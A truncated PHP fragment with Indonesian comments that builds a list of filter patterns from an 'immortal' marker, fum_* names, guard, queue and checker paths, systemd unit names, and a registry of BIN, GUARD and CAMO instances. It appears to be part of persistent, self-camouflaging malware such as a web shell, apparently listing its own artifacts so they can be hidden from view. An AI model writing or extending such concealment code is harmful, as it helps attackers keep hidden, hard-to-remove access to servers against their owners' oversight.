/* pola filter dari SUMBER HIDUP (bukan hardcode): marker immortal, fum_*,
   path guard/queue/qrun/checker/at/state immortal, nama unit systemd, dan
   registry instance (BIN/GUARD/CAMO/GCAMO + basename masing-masing) */
function gsp_sil_patterns() {
    $p = array();
    $p[] = gsp_imm_id();
    $p[] = 'fum_';
    $p[] = fum_guard_path();
    $p[] = gsp_home() . '/.fum_queue';
